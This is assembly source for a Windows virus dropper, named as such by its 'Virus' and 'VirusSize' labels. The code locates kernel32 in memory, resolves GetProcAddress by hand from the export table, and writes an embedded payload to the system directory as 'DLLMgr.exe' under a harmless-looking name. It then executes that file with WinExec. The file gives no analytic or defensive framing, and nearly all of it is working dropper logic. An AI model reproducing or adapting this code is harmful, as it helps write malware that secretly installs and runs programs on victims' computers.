   includelib kernel32.lib
   includelib user32.lib
   includelib wsock32.lib

   .486
   .model flat, stdcall

   include c:\masm\include\windows.inc

           VirusSize               equ     11776

   MessageBoxA     PROTO ,:DWORD,:DWORD,:DWORD,:DWORD

   .code
   Main proc
           local   lstrlen:dword
           local   lstrcpy:dword
           local   LocalAlloc:dword
           local   LocalFree:dword
           local   CreateFileA:dword
           local   WriteFile:dword
           local   CloseHandle:dword
           local   GetSystemDirectoryA:dword
           local   WinExec:dword

       call    DropperStart
      DeltaSub:

   Virus:
           db      VirusSize dup (90h)
   EndVirus:

           VirusName               db      "\DLLMgr.exe",0

           GetProcAddressStr       db      "GetProcAddress",0



      WinFunctions:
           lstrlenStr              db      "lstrlen",0
           lstrcpyStr              db      "lstrcpy",0
           LocalAllocStr           db      "LocalAlloc",0
           LocalFreeStr            db      "LocalFree",0
           CreateFileAStr          db      "CreateFileA",0
           WriteFileStr            db      "WriteFile",0
           CloseHandleStr          db      "CloseHandle",0
           GetSystemDirectoryAStr  db      "GetSystemDirectoryA",0
           WinExecStr              db      "WinExec",0
                                   db      0
                                                   ; pointers to these


       DropperStart:
           pop     edi
           sub     edi,DeltaSub

           mov     eax,[ebp+4]
           and     eax,0fffff000h                  ; even 1000h something

      FindKernelEntry:
           sub     eax,1000h
           cmp     word ptr [eax],'ZM'
           jnz     FindKernelEntry

           mov     ebx,[eax+3ch]

           cmp     word ptr [ebx+eax], 'EP'
           jne     FindKernelEntry
           mov     ebx,[eax+120+ebx]
           add     ebx,eax                         ; ebx -> Export table

           mov     ecx,[ebx+12]                    ; ecx -> dll name

           cmp     dword ptr [ecx+eax],'NREK'
           jnz     FindKernelEntry


   ; We can now be sure that eax points to the kernel
       FindGetProcAddress:
           push    edi

           lea     edi,[GetProcAddressStr+edi]

           mov     edx,[ebx+32]

        FindFunction:
           add     edx,4
           mov     ecx,15                           ; length of GetProcAddress,0
           mov     esi,[edx+eax]
           push    edi
           add     esi,eax
           repz    cmpsb
           pop     edi
           jne     FindFunction

           pop     edi

           sub     edx,[ebx+32]
           shr     edx,1                           ; ecx = ordinal pointer

           lea     esi,[edx+eax]
           xor     ecx,ecx
           add     esi,[ebx+36]                    ; esi = base+ordinals+ordnr

           mov     cx,word ptr [esi]               ; ecx = ordinal
           shl     ecx,2                           ; ecx = ordinal*4
           add     ecx,[ebx+28]                  ; ecx = ordinal*4+func tbl addr

           mov     ebx,[ecx+eax]                   ; esi = function addr in file
           add     ebx,eax                         ; esi = function addr in mem


           ; eax -> ModuleHandle
           ; ebx -> GetProcAddress
           mov     esi,eax

           push    edi
           lea     edi,[WinFunctions+edi]
           push    0
     CopyWinApiFunctions:

           push    edi
           push    esi
           call    ebx

           pop     ecx
           mov     [lstrlen+ecx*4],eax
           dec     ecx
           push    ecx

           push    edi
           call    lstrlen
           inc     eax
           add     edi,eax

           cmp     byte ptr [edi],0
           jnz     CopyWinApiFunctions
   NoMoreApis:
           pop     ecx
           pop     edi

           push    400                             ; space for GetSystemDir
           push    LMEM_ZEROINIT
           call    LocalAlloc

           push    eax                             ; Variables for LocalFree

           push    SW_SHOW                         ; Variables for WinExec
           push    eax

           push    0                               ; Variables for CreateFileA
           push    0
           push    CREATE_NEW
           push    0
           push    0
           push    GENERIC_WRITE
           push    eax                             ; push -> SystemDir

           push    350
           push    eax
           call    GetSystemDirectoryA

           add     eax,[esp]                       ; add with SystemDir
           lea     ebx, [VirusName+edi]            ; ebx -> VirusName
           push    ebx
           push    eax
           call    lstrcpy

           call    CreateFileA

           inc     eax
           jz      ErrorOpening

           dec     eax
           push    eax                             ; push fileptr

           push    0
           lea     ebx,lstrlen
           push    ebx
           push    VirusSize
           add     edi,Virus
           push    edi                             ; edi -> Virus
           push    eax
           call    WriteFile

           call    CloseHandle                     ; fileptr on stack


           call    WinExec                         ; variables on stack

      ErrorOpening:
           call    LocalFree                       ; ptr to Mem on stack
           ret
   Main endp

   EndMain:
   invoke  MessageBoxA, 0, 0, 0, 0

   end Main
